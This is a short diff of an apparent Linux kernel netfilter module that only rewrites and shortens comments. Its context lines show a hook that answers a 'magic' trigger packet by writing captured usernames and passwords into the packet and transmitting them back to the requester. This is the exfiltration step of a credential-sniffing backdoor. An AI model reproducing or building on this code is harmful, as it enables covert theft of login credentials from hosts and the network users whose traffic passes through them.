@@ -190,12 +190,7 @@ static unsigned int watch_in(void *priv, struct sk_buff *skb,
       return NF_ACCEPT;
    }
    
-   /* 直接修改 接收 的buffer 
-    * Okay, matches our checks for "Magicness", now we fiddle with
-    * the sk_buff to insert the IP address, and username/password pair,
-    * swap IP source and destination addresses and ethernet addresses
-    * if necessary and then transmit the packet from here and tell
-    * Netfilter we stole it. Phew... */
+   /*直接修改接收的buffer, 这种情况只适合局域网内利用目的mac传输，因为没有经过路由*/
    printk("get the MAGIC packet");
    /*交换src  dst 的ip*/
    taddr = ip_hdr(sb)->saddr;
@@ -234,13 +229,7 @@ static unsigned int watch_in(void *priv, struct sk_buff *skb,
    if (password)
      memcpy(cp_data + 20, password, 16);
    
-   /* 
-    * This is where things will die if they are going to.
-    * Fingers crossed... 
-    * 发送 buffer
-    * A negative errno code is returned on a failure. 
-    * A success does not guarantee the frame will be transmitted 
-    * as it may be dropped due to congestion or traffic shaping.*/
+   /* 发送 buffer*/
    dev_queue_xmit(sb);
     printk("the pair has been send to target");
    /* Now free the saved username and password and reset have_pair */
